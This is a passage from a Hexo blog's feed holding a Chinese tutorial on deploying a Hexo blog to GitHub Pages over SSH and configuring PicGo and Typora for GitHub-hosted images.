id="打开你的github主页，进入个人设置-SSH-and-GPG-keys-New-SSH-key：。将复制的内容在key中进行粘贴保存。"><a href="#打开你的github主页，进入个人设置-SSH-and-GPG-keys-New-SSH-key：。将复制的内容在key中进行粘贴保存。" class="headerlink" title="打开你的github主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key：。将复制的内容在key中进行粘贴保存。"></a>打开你的github主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key：。将复制的内容在key中进行粘贴保存。<img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701322727655-0034a2e1-fbd5-4a2c-bb7b-a52eb76bb7ec.png" alt="image.png"  /><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701322755472-3aba588c-1b9f-4b38-b1b1-c0e9eda433f8.png" alt="image.png"></h2></li><li><h2 id="尝试ssh连接-测试是否成功-输入指令："><a href="#尝试ssh连接-测试是否成功-输入指令：" class="headerlink" title="尝试ssh连接,测试是否成功,输入指令："></a>尝试ssh连接,测试是否成功,输入指令：</h2></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com <span class="comment">#注意邮箱地址不用改</span></span><br></pre></td></tr></table></figure><ol start="9"><li><h2 id="如果提示Are-you-sure-you-want-to-continue-connecting-yes-no-，输入yes，然后会看到下面这个，就算成功："><a href="#如果提示Are-you-sure-you-want-to-continue-connecting-yes-no-，输入yes，然后会看到下面这个，就算成功：" class="headerlink" title="如果提示Are you sure you want to continue connecting (yes&#x2F;no)?，输入yes，然后会看到下面这个，就算成功："></a>如果提示Are you sure you want to continue connecting (yes&#x2F;no)?，输入yes，然后会看到下面这个，就算成功：<img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701322943589-6d4dca38-113b-41cd-af21-4366d65d3bff.png" alt="image.png"><br /></h2></li><li><h2 id="以管理员模式运行cmd，并且输入“blog”所在目录，指令为："><a href="#以管理员模式运行cmd，并且输入“blog”所在目录，指令为：" class="headerlink" title="以管理员模式运行cmd，并且输入“blog”所在目录，指令为："></a>以管理员模式运行cmd，并且输入“blog”所在目录，指令为：</h2></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd E:\web wenjianjjjjjjjjjjjjjjjjjjj\hexo\blog</span><br><span class="line">e: E:\web wenjianjjjjjjjjjjjjjjjjjjj\hexo\blog</span><br><span class="line"><span class="comment">#注意：如果是在c盘“e：”改为“cd”，若在其他盘，则“e：”改为对应即可</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701322143452-2ac26a42-7a0b-4420-acca-a84a2f274dca.png" alt="image.png"><br /></p><ol start="11"><li><h2 id="输入指令"><a href="#输入指令" class="headerlink" title="输入指令"></a>输入指令</h2></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git –save</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701323232283-1f40782b-56d6-4ac3-ab8e-5cbfd3063cf6.png" alt="image.png"><br /></p><ol start="12"><li><h2 id="在上一个Git-Bash-Here还需要继续配置，输入指令："><a href="#在上一个Git-Bash-Here还需要继续配置，输入指令：" class="headerlink" title="在上一个Git Bash Here还需要继续配置，输入指令："></a>在上一个Git Bash Here还需要继续配置，输入指令：</h2></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config –-<span class="keyword">global</span> user.name “luozhixiaowo”<span class="comment">#你的github用户名，非昵称</span></span><br><span class="line">git config –-<span class="keyword">global</span> user.email “xxx@qq.com“<span class="comment">#填写你的github注册邮箱</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701323409087-fa73cd82-708c-4f26-9b42-5e4c323607d2.png" alt="image.png"><br />（因为是第二次所以会有相应提示）<br /></p><ol start="13"><li><h2 id="在github上新建一个存储库，命名为github的用户名-github-io"><a href="#在github上新建一个存储库，命名为github的用户名-github-io" class="headerlink" title="在github上新建一个存储库，命名为github的用户名.github.io"></a>在github上新建一个存储库，命名为<strong>github的用户名.github.io</strong><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701323480300-036decfb-16c5-45b6-b739-17d11c3b9d97.png" alt="image.png"><br /></h2></li><li><h2 id="编辑目录“E-web-wenjianjjjjjjjjjjjjjjjjjjj-hexo-blog”中的-config-yml文件，加入指令："><a href="#编辑目录“E-web-wenjianjjjjjjjjjjjjjjjjjjj-hexo-blog”中的-config-yml文件，加入指令：" class="headerlink" title="编辑目录“E:\web wenjianjjjjjjjjjjjjjjjjjjj\hexo\blog”中的_config.yml文件，加入指令："></a>编辑目录“E:\web wenjianjjjjjjjjjjjjjjjjjjj\hexo\blog”中的_config.yml文件，加入指令：</h2></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  repository: git@github.com:luozhixiaowo/luozhixiaowo.github.io.git</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701323625767-d10daae6-c956-445d-955a-c7d1a04d9c92.png" alt="image.png"><br /></p><ol start="15"><li><h2 id="输入指令“hexo-d”上传（每次上传成功之后，需要等待1-3分钟，用来刷新页面"><a href="#输入指令“hexo-d”上传（每次上传成功之后，需要等待1-3分钟，用来刷新页面" class="headerlink" title="输入指令“hexo d”上传（每次上传成功之后，需要等待1-3分钟，用来刷新页面)"></a>输入指令“hexo d”上传（每次上传成功之后，需要等待1-3分钟，用来刷新页面)<img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701323737679-ba9a54e5-8734-44a3-8c59-66b23458fc3b.png" alt="image.png"><br /></h2></li><li><h2 id="hexo命令介绍"><a href="#hexo命令介绍" class="headerlink" title="hexo命令介绍"></a>hexo命令介绍</h2></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">hexo n <span class="string">&quot;我的博客&quot;</span> == hexo new <span class="string">&quot;我的博客&quot;</span> <span class="comment">#新建文章</span></span><br><span class="line">hexo new page <span class="string">&quot;pageName&quot;</span> <span class="comment">#新建页面</span></span><br><span class="line">hexo g == hexo generate <span class="comment">#生成</span></span><br><span class="line">hexo s == hexo server <span class="comment">#启动服务预览</span></span><br><span class="line">hexo d == hexo deploy <span class="comment">#部署</span></span><br><span class="line"></span><br><span class="line">hexo server <span class="comment">#Hexo会监视文件变动并自动更新，无须重启服务器</span></span><br><span class="line">hexo server -s <span class="comment">#静态模式</span></span><br><span class="line">hexo server -p <span class="number">5000</span> <span class="comment">#更改端口</span></span><br><span class="line">hexo server -i <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> <span class="comment">#自定义 IP</span></span><br><span class="line">hexo clean <span class="comment">#清除缓存，若是网页正常情况下可以忽略这条命令</span></span><br><span class="line">hexo version  <span class="comment">#查看Hexo的版本</span></span><br><span class="line">hexo generate <span class="comment">#生成静态页面至public目录</span></span><br><span class="line"></span><br><span class="line">hexo s -g <span class="comment">#生成并本地预览</span></span><br><span class="line">hexo d -g <span class="comment">#生成并上传</span></span><br></pre></td></tr></table></figure><h1 id="HEXO博客文章管理"><a href="#HEXO博客文章管理" class="headerlink" title="HEXO博客文章管理"></a>HEXO博客文章管理</h1><ol><li><h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2></li></ol><blockquote><ul><li>下载并安装<a href="https://nodejs.org/en">node.js</a></li><li>下载并安装<a href="https://molunerfinn.com/PicGo/">PicGo</a></li><li>下载并安装Typora</li></ul></blockquote><ol start="2"><li><h2 id="对PicGo图床进行配置"><a href="#对PicGo图床进行配置" class="headerlink" title="对PicGo图床进行配置"></a>对PicGo图床进行配置</h2></li></ol><ul><li><p>在“GitHub”中新建一个库命名为“xxxx”<img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231201132307470.png" alt="image-20231201132307470"></p></li><li><p>创建一个密钥设置&lt;Developer settigs</p></li></ul><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231201131449195.png" alt="image-20231201131449195"></p><ul><li><p>命名并且设置永不更新，随后点击创建<img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231201131532160.png" alt="image-20231201131532160"></p></li><li><p>打开“PicGo”，点击图床设置找到“GitHub”，将刚刚得到的密钥以及库名输入并且保存，如图所示</p></li></ul><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231201131808212.png" alt="image-20231201131808212"></p><ol start="3"><li><h2 id="对“Typora”进行偏好设置，如图所示"><a href="#对“Typora”进行偏好设置，如图所示" class="headerlink" title="对“Typora”进行偏好设置，如图所示"></a>对“Typora”进行偏好设置，如图所示<img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231201131925203.png" alt="image-20231201131925203"></h2></li></ol><ul><li>随后点击图片上传选项，若如图所示则为成功</li></ul><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231201132025180.png" alt="image-20231201132025180"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;电脑空间回收&quot;&gt;&lt;a href=&quot;#电脑空间回收&quot; class=&quot;headerlink&quot; title=&quot;电脑空间回收&quot;&gt;&lt;/a&gt;电脑空间回收&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;&lt;h2 id=&quot;下载dism软件Dism-10-1-1002-1-zip&quot;&gt;&lt;a href=&quot;#</summary>
      
    
    
    
    
    <category term="1" scheme="http://example.com/tags/1/"/>
    
  </entry>
  
</feed>
